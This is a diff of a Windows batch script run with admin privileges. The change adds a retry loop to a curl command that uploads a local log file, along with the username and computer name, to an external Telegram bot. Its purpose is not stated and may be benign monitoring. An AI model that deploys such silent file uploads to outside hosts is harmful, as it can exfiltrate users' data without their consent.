@@ -9,7 +9,7 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=2.3"
+set "BATCHVERSION=2.4"
 echo BATCHVERSION=%BATCHVERSION%
 timeout /t 70 /nobreak
 
@@ -90,17 +90,31 @@ echo.
 echo.
 
 
+
+
+
+:SENDINGLASTMSG
+set "RESULT=%TEMP%\TGRESU.txa"
+del /f /q "%RESULT%"
+
 set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|LoggedIn(1)|%MESSAGEEVERY%|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"
 
 
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendDocument" -F "chat_id=%CHAT_ID_RUNNING%" -F "message_thread_id=%TOPIC_ID_RUNNING%" -F "caption=%ENCODED_MESSAGE_RUNNING%" -F "document=@%LOGFILE1%" > "%RESULT%"
+
+findstr /i "message_id" "%RESULT%" >nul
+if %errorlevel%==0 (
+    echo Message sent successfully!
+    echo.
+) else (
+    echo Failed to send message. Retrying...
+    echo.
+    timeout /t 2 /nobreak
+    goto SENDINGLASTMSG
+)
 
 
-curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendDocument" ^
-     -F "chat_id=%CHAT_ID_RUNNING%" ^
-     -F "message_thread_id=%TOPIC_ID_RUNNING%" ^
-     -F "caption=%ENCODED_MESSAGE_RUNNING%" ^
-     -F "document=@%LOGFILE1%"
 
 
 
